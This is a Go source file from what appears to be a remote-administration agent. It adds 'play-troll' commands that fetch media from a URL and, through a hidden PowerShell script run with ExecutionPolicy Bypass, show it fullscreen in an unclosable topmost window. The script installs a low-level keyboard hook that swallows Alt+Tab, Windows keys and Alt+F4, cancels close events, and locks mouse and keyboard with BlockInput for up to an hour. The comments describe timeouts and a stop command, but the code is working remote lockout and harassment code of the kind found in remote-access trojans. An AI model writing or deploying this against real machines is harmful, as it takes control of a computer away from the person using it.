package commands

import (
	"context"
	"fmt"
	"image/gif"
	"image/png"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// play-troll / stop-troll (v1.45.2): unskippable fullscreen media lockdown.
// Media = local path on the remote PC or http(s) URL (downloaded first).
// Format: MP4/MOV/AVI/WMV (WPF MediaElement) or GIF/animated PNG (WinForms
// ImageAnimator). Window is chrome-less, topmost, no taskbar entry, kills
// Alt+F4 via no-close chrome + re-assert. BlockInput(true) eats mouse+keys
// for the duration (Ctrl+Alt+Del still works — user-mode cannot block SAS).
// SAFETY (non-negotiable): default 300s auto-stop, hard cap 3600s, and the
// player itself unblocks input on close/timeout; stop-troll always kills +
// BlockInput(false) even if the player hung. maxTrollSeconds keeps a dead
// URL from bricking the box.

const (
	defaultTrollSeconds = 300
	maxTrollSeconds     = 3600
)

func trollPIDFile() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM", "troll.pid")
	}
	return filepath.Join(os.TempDir(), "RMM", "troll.pid")
}

func trollMediaDir() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM", "troll")
	}
	return filepath.Join(os.TempDir(), "RMM", "troll")
}

func trollStatusFile() string {
	return filepath.Join(trollMediaDir(), "status.txt")
}

// Media the player can actually open. Anything else fails fast with a
// clear error instead of a black flash + instant close (MediaFailed).
var trollVideoExts = map[string]bool{
	".mp4": true, ".m4v": true, ".mov": true, ".avi": true,
	".wmv": true, ".mpg": true, ".mpeg": true, ".mkv": true,
	".webm": true,
}

var trollImageExts = map[string]bool{
	".gif": true, ".png": true, ".jpg": true, ".jpeg": true, ".bmp": true,
}

func trollExtKind(ext string) string {
	if trollImageExts[ext] {
		return "image"
	}
	if trollVideoExts[ext] {
		return "video"
	}
	return ""
}

// validateTrollImage header-decodes stills so a corrupt/renamed file
// errors here, not as a silent player bail.
func validateTrollImage(local, ext string) error {
	f, err := os.Open(local)
	if err != nil {
		return err
	}
	defer f.Close()
	switch ext {
	case ".gif":
		_, err = gif.DecodeConfig(f)
	case ".png":
		_, err = png.DecodeConfig(f)
	default:
		return nil // jpg/bmp: player-side (FromFile throws -> status fail)
	}
	if err != nil {
		return fmt.Errorf("not a valid %s: %v", ext, err)
	}
	return nil
}

// play-troll <path|url> [seconds] [noloop]
// seconds: 1-3600, default 300. noloop: play once then auto-close.
func playTroll(arg string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	fields := strings.Fields(strings.TrimSpace(arg))
	if len(fields) == 0 {
		return "", fmt.Errorf("usage: play-troll <path|url> [seconds 1-3600] [noloop]")
	}
	src := fields[0]
	secs := defaultTrollSeconds
	loop := true
	if len(fields) >= 2 {
		n, err := strconv.Atoi(fields[1])
		if err != nil || n <= 0 {
			return "", fmt.Errorf("usage: play-troll <path|url> [seconds 1-3600] [noloop]")
		}
		if n > maxTrollSeconds {
			n = maxTrollSeconds
		}
		secs = n
	}
	if len(fields) >= 3 && strings.EqualFold(fields[2], "noloop") {
		loop = false
	}

	// Kill any previous troll first (one at a time — lock, not a pile-up).
	stopTrollInternal()

	local := src
	if strings.HasPrefix(src, "http://") || strings.HasPrefix(src, "https://") {
		dl, err := downloadTroll(src)
		if err != nil {
			return "", fmt.Errorf("troll download failed: %w", err)
		}
		local = dl
	}
	st, err := os.Stat(local)
	if err != nil {
		return "", fmt.Errorf("troll media not found: %s", local)
	}
	if st.Size() == 0 {
		return "", fmt.Errorf("troll media is empty: %s", local)
	}

	ext := strings.ToLower(filepath.Ext(local))
	if trollExtKind(ext) == "" {
		return "", fmt.Errorf("unsupported troll media type %q (video: mp4/mov/avi/wmv/mkv/webm, image: gif/png/jpg/bmp)", ext)
	}
	if trollImageExts[ext] {
		if err := validateTrollImage(local, ext); err != nil {
			return "", fmt.Errorf("troll media invalid: %w", err)
		}
	}

	// Fresh status handshake: the player must write "opened" (or a
	// "failed:" reason) or playTroll reports failure instead of claiming
	// success over a black flash.
	_ = os.MkdirAll(trollMediaDir(), 0755)
	statusPath := trollStatusFile()
	_ = os.Remove(statusPath)
	script, err := trollScript(local, ext, secs, loop, statusPath)
	if err != nil {
		return "", err
	}
	cmd := hideWindow(exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-command", script))
	if err := cmd.Start(); err != nil {
		return "", err
	}
	_ = os.MkdirAll(filepath.Dir(trollPIDFile()), 0755)
	_ = os.WriteFile(trollPIDFile(), []byte(strconv.Itoa(cmd.Process.Pid)), 0644)
	go cmd.Wait()
	loopNote := "looping"
	if !loop {
		loopNote = "once"
	}
	// Wait for proof of playback (MediaOpened / Shown). A codec miss or
	// bad path used to look identical to success: black flash, instant
	// close, "troll playing ..." lie. Now it errors with the reason.
	for i := 0; i < 120; i++ {
		time.Sleep(100 * time.Millisecond)
		b, err := os.ReadFile(statusPath)
		if err != nil {
			continue
		}
		st := strings.TrimSpace(string(b))
		if st == "opened" {
			return fmt.Sprintf("troll playing %s (%s, %ds, input blocked — stop-troll or timeout %ds)", filepath.Base(local), loopNote, secs, secs), nil
		}
		if strings.HasPrefix(st, "failed:") || strings.HasPrefix(st, "timeout") {
			stopTrollInternal()
			return "", fmt.Errorf("troll media failed: %s", strings.TrimSpace(strings.TrimPrefix(strings.TrimPrefix(st, "failed:"), "timeout")))
		}
	}
	stopTrollInternal()
	return "", fmt.Errorf("troll player did not confirm playback within 12s (codec or path?)")
}

// stop-troll: unblock input FIRST (survives a hung player), then kill.
func stopTroll() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	pid, ok := stopTrollInternal()
	if !ok {
		return "no troll running (input already free)", nil
	}
	return fmt.Sprintf("troll stopped (pid %d, input unblocked)", pid), nil
}

// stopTrollInternal unblocks input + kills the player. Returns pid, found.
func stopTrollInternal() (int, bool) {
	// Unblock input even if the player is wedged — BlockInput(false) from
	// any process with the right integrity level clears the desktop lock.
	unblock := `Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class RmmTrollBlk {
  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
}
'@; [void][RmmTrollBlk]::BlockInput($false)`
	_, _ = execPS(unblock)

	pid := 0
	b, err := os.ReadFile(trollPIDFile())
	if err == nil {
		if n, e := strconv.Atoi(strings.TrimSpace(string(b))); e == nil && n > 0 {
			pid = n
		}
	}
	_ = os.Remove(trollPIDFile())
	if pid > 0 {
		_ = hideWindow(exec.Command("taskkill", "/F", "/PID", strconv.Itoa(pid))).Run()
	}
	return pid, pid > 0
}

func downloadTroll(url string) (string, error) {
	dir := trollMediaDir()
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", err
	}
	name := "m.dat"
	if u := strings.SplitN(strings.SplitN(url, "?", 2)[0], "/", 2); len(u) == 2 && u[1] != "" {
		base := u[1]
		if i := strings.LastIndexByte(base, '/'); i >= 0 {
			base = base[i+1:]
		}
		if base != "" && len(base) < 80 {
			name = base
		}
	}
	dst := filepath.Join(dir, name)
	client := &http.Client{Timeout: 60 * time.Second}
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", err
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	// URLs without a media filename (query links, "m.dat") would land on
	// the wrong player branch: infer the extension from Content-Type.
	if trollExtKind(strings.ToLower(filepath.Ext(dst))) == "" {
		if ext := trollExtForContentType(resp.Header.Get("Content-Type")); ext != "" {
			dst += ext
		}
	}
	f, err := os.Create(dst)
	if err != nil {
		return "", err
	}
	defer f.Close()
	// 80MB cap: troll media, not an update payload.
	if _, err := io.Copy(f, io.LimitReader(resp.Body, 80<<20)); err != nil {
		return "", err
	}
	return dst, nil
}

// trollExtForContentType maps a download Content-Type to a file
// extension so extension-less URLs still pick the right player branch.
func trollExtForContentType(ct string) string {
	ct = strings.ToLower(strings.TrimSpace(strings.SplitN(ct, ";", 2)[0]))
	switch ct {
	case "video/mp4":
		return ".mp4"
	case "video/x-msvideo":
		return ".avi"
	case "video/quicktime":
		return ".mov"
	case "video/x-ms-wmv":
		return ".wmv"
	case "video/webm":
		return ".webm"
	case "video/mpeg":
		return ".mpg"
	case "video/x-matroska":
		return ".mkv"
	case "image/gif":
		return ".gif"
	case "image/png":
		return ".png"
	case "image/jpeg":
		return ".jpg"
	case "image/bmp":
		return ".bmp"
	}
	return ""
}

// trollStatus reports the player state: running pid + last playback proof.
func trollStatus() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
	}
	var sb strings.Builder
	if b, err := os.ReadFile(trollPIDFile()); err == nil {
		pid := strings.TrimSpace(string(b))
		alive := ""
		if n, e := strconv.Atoi(pid); e == nil && n > 0 {
			out, _ := runHidden(context.Background(), "tasklist", "/FI", "PID eq "+strconv.Itoa(n), "/NH")
			if strings.Contains(string(out), pid) {
				alive = " (running)"
			} else {
				alive = " (stale pid file — player gone)"
			}
		}
		sb.WriteString("troll pid " + pid + alive + "\n")
	} else {
		sb.WriteString("no troll pid file (never played or stopped)\n")
	}
	if b, err := os.ReadFile(trollStatusFile()); err == nil {
		sb.WriteString("last playback: " + strings.TrimSpace(string(b)) + "\n")
	} else {
		sb.WriteString("no playback proof yet\n")
	}
	return sb.String(), nil
}

// trollScript builds the lockdown player. Branch on media kind:
//   - video extensions → WPF MediaElement fullscreen loop
//   - gif/png/jpg/bmp → WinForms frame animator / static Image
// Shared lockdown, every branch:
//   - no chrome, TopMost (re-asserted 2x/sec), no taskbar
//   - FormClosing/Closing CANCELLED unless our own stop fires: the
//     Alt+Tab thumbnail X, Alt+F4 and Alt+Space all die here.
//     (taskkill still works — TerminateProcess can't be cancelled —
//     which is exactly what stop-troll uses.)
//   - low-level keyboard hook swallows Alt+Tab, Alt+Esc, Win keys,
//     Alt+F4, Ctrl+Esc (Ctrl+Alt+Del is unbeatable by design).
//   - BlockInput re-asserted on the same tick (its first call can fail
//     under integrity mismatch; retrying holds the lock once it sticks).
//   - status file: "opened" on show, "failed: <reason>" on media error,
//     so playTroll reports proof instead of claiming success.
func trollScript(path, ext string, secs int, loop bool, status string) (string, error) {
	// Embedded via here-string; paths single-quoted for PS (psQuote).
	q := psQuote(path)
	qs := psQuote(status)
	isGIF := ext == ".gif" || ext == ".png"
	loopI := 0
	if loop {
		loopI = 1
	}
	if isGIF {
		// WinForms: ImageAnimator handles GIF delay tables; PNG is static.
		return fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class RmmTrollHook {
  public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
  public static HookProc proc;
  public static IntPtr hookId = IntPtr.Zero;
  [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
  [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr hhk);
  [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
  [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
  [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);
  static bool KeyDown(int vk) { return (GetAsyncKeyState(vk) & 0x8000) != 0; }
  public static IntPtr Callback(int nCode, IntPtr wParam, IntPtr lParam) {
    if (nCode >= 0 && (wParam == (IntPtr)0x0100 || wParam == (IntPtr)0x0104)) {
      int vk = Marshal.ReadInt32(lParam);
      bool alt = KeyDown(0x12), ctrl = KeyDown(0x11);
      if ((vk == 0x09 && alt) || (vk == 0x1B && (alt || ctrl)) ||
          (vk == 0x73 && alt) || vk == 0x5B || vk == 0x5C) {
        return (IntPtr)1;
      }
    }
    return CallNextHookEx(hookId, nCode, wParam, lParam);
  }
  public static void Install() {
    proc = new HookProc(Callback);
    using (Process p = Process.GetCurrentProcess())
    using (ProcessModule m = p.MainModule) {
      hookId = SetWindowsHookEx(13, proc, GetModuleHandle(m.ModuleName), 0);
    }
  }
  public static void Uninstall() {
    if (hookId != IntPtr.Zero) { UnhookWindowsHookEx(hookId); hookId = IntPtr.Zero; }
  }
  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
  [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
}
'@
[void][RmmTrollHook]::SetProcessDPIAware()
[RmmTrollHook]::Install()
$path = %s
$status = %s
$secs = %d
$loop = %d
$script:allowClose = $false
function Stop-TrollLockdown {
  $script:allowClose = $true
  [void][RmmTrollHook]::BlockInput($false)
  [RmmTrollHook]::Uninstall()
  $f.Close()
}
$f = New-Object System.Windows.Forms.Form
$f.Text = ''
$f.FormBorderStyle = 'None'
$f.WindowState = 'Maximized'
$f.TopMost = $true
$f.ShowInTaskbar = $false
$f.StartPosition = 'CenterScreen'
$f.BackColor = [System.Drawing.Color]::Black
# Alt+Tab thumbnail X, Alt+F4, Alt+Space all arrive as FormClosing — die.
$f.Add_FormClosing({ param($s,$e) if (-not $script:allowClose) { $e.Cancel = $true } })
$pic = New-Object System.Windows.Forms.PictureBox
$pic.Dock = 'Fill'
$pic.SizeMode = 'Zoom'
try {
  $img = [System.Drawing.Image]::FromFile($path)
} catch {
  Set-Content -Path $status -Value ('failed: ' + $_.Exception.Message)
  [RmmTrollHook]::Uninstall()
  exit 3
}
$pic.Image = $img
$f.Controls.Add($pic)
$frame = 0
$anim = New-Object System.Windows.Forms.Timer
$anim.Interval = 60
$anim.Add_Tick({
  if ($loop -and [System.Drawing.Image]::IsAnimatedImage($img)) {
    $frame = ($frame + 1) %% [System.Drawing.Image]::GetFrameCount([System.Drawing.Imaging.FrameDimension]::Time)
    $img.SelectActiveFrame([System.Drawing.Imaging.FrameDimension]::Time, $frame) | Out-Null
    $pic.Image = $img.Clone()
  }
})
if ($loop) { $anim.Start() }
# Guard tick: re-assert TopMost/focus/input 2x/sec (fights Win+D and
# focus theft) and hard-stops at $secs.
$born = Get-Date
$guard = New-Object System.Windows.Forms.Timer
$guard.Interval = 500
$guard.Add_Tick({
  if (-not $script:allowClose) {
    $f.TopMost = $false; $f.TopMost = $true
    $f.Activate() | Out-Null
    [void][RmmTrollHook]::BlockInput($true)
  }
  if (((Get-Date) - $born).TotalSeconds -ge $secs) { Stop-TrollLockdown }
})
$guard.Start()
$f.Add_FormClosed({ param($s,$e) [void][RmmTrollHook]::BlockInput($false); [RmmTrollHook]::Uninstall(); if ($img) { $img.Dispose() } })
# Proof of playback first, input lock second (never a locked black box).
$f.Add_Shown({
  Set-Content -Path $status -Value 'opened'
  [void][RmmTrollHook]::BlockInput($true)
})
[void]$f.ShowDialog()
$f.Dispose()`, q, qs, secs, loopI), nil
	}
	// Video path — WPF MediaElement (MP4/MOV/AVI/WMV/MKV depending on codecs).
	return fmt.Sprintf(`Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class RmmTrollHookV {
  public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
  public static HookProc proc;
  public static IntPtr hookId = IntPtr.Zero;
  [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
  [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr hhk);
  [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
  [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
  [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);
  static bool KeyDown(int vk) { return (GetAsyncKeyState(vk) & 0x8000) != 0; }
  public static IntPtr Callback(int nCode, IntPtr wParam, IntPtr lParam) {
    if (nCode >= 0 && (wParam == (IntPtr)0x0100 || wParam == (IntPtr)0x0104)) {
      int vk = Marshal.ReadInt32(lParam);
      bool alt = KeyDown(0x12), ctrl = KeyDown(0x11);
      if ((vk == 0x09 && alt) || (vk == 0x1B && (alt || ctrl)) ||
          (vk == 0x73 && alt) || vk == 0x5B || vk == 0x5C) {
        return (IntPtr)1;
      }
    }
    return CallNextHookEx(hookId, nCode, wParam, lParam);
  }
  public static void Install() {
    proc = new HookProc(Callback);
    using (Process p = Process.GetCurrentProcess())
    using (ProcessModule m = p.MainModule) {
      hookId = SetWindowsHookEx(13, proc, GetModuleHandle(m.ModuleName), 0);
    }
  }
  public static void Uninstall() {
    if (hookId != IntPtr.Zero) { UnhookWindowsHookEx(hookId); hookId = IntPtr.Zero; }
  }
  [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
  [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
}
'@
[void][RmmTrollHookV]::SetProcessDPIAware()
[RmmTrollHookV]::Install()
$path = %s
$status = %s
$secs = %d
$loop = %d
$script:allowClose = $false
$script:opened = $false
function Stop-TrollLockdownV {
  $script:allowClose = $true
  [void][RmmTrollHookV]::BlockInput($false)
  [RmmTrollHookV]::Uninstall()
  $w.Close()
}
$uri = (New-Object System.Uri($path)).AbsoluteUri
$w = New-Object System.Windows.Window
$w.Title = ''
$w.WindowStyle = 'None'
$w.ResizeMode = 'NoResize'
$w.WindowState = 'Maximized'
$w.Topmost = $true
$w.ShowInTaskbar = $false
$w.Background = [System.Windows.Media.Brushes]::Black
$w.WindowStartupLocation = 'CenterScreen'
# Task-view X, Alt+F4, Alt+Space all arrive as Closing — die.
$w.Add_Closing({ param($s,$e) if (-not $script:allowClose) { $e.Cancel = $true } })
$me = New-Object System.Windows.Controls.MediaElement
$me.Source = $uri
$me.LoadedBehavior = 'Manual'
$me.UnloadedBehavior = 'Manual'
$me.Stretch = 'Uniform'
$me.IsMuted = $false
$w.Content = $me
$me.Add_MediaOpened({ $script:opened = $true; Set-Content -Path $status -Value 'opened'; $me.Play() })
if ($loop -eq 1) {
  $me.Add_MediaEnded({
    $me.Position = [TimeSpan]::Zero
    $me.Play()
  })
} else {
  $me.Add_MediaEnded({ Stop-TrollLockdownV })
}
$me.Add_MediaFailed({
  param($s,$e)
  # Poison path with a reason: never a locked black box, never silence.
  $msg = 'unknown media error'
  if ($e -and $e.ErrorException) { $msg = $e.ErrorException.Message }
  Set-Content -Path $status -Value ('failed: ' + $msg)
  Stop-TrollLockdownV
})
# No-proof watchdog: MediaOpened never fired (missing codec, bad path) —
# report it instead of sitting on a black locked screen.
$born = Get-Date
$watchTimer = New-Object System.Windows.Threading.DispatcherTimer
$watchTimer.Interval = New-Object TimeSpan(0,0,0,10,0)
$watchTimer.Add_Tick({
  $watchTimer.Stop()
  if (-not $script:opened) {
    Set-Content -Path $status -Value 'timeout-no-media (no MediaOpened in 10s: missing codec or bad path?)'
    Stop-TrollLockdownV
  }
})
$watchTimer.Start()
# Guard tick: re-assert TopMost/focus/input 2x/sec and hard-stop at $secs.
$guardTimer = New-Object System.Windows.Threading.DispatcherTimer
$guardTimer.Interval = New-Object TimeSpan(0,0,0,0,500)
$guardTimer.Add_Tick({
  if (-not $script:allowClose) {
    $w.Topmost = $false; $w.Topmost = $true
    $w.Activate() | Out-Null
    [void][RmmTrollHookV]::BlockInput($true)
  }
  if (((Get-Date) - $born).TotalSeconds -ge $secs) { Stop-TrollLockdownV }
})
$guardTimer.Start()
$w.Add_Closed({
  [void][RmmTrollHookV]::BlockInput($false)
  [RmmTrollHookV]::Uninstall()
  $watchTimer.Stop()
  $guardTimer.Stop()
})
$w.Add_Shown({
  [void][RmmTrollHookV]::BlockInput($true)
})
[void]$w.ShowDialog()`, q, qs, secs, loopI), nil
}
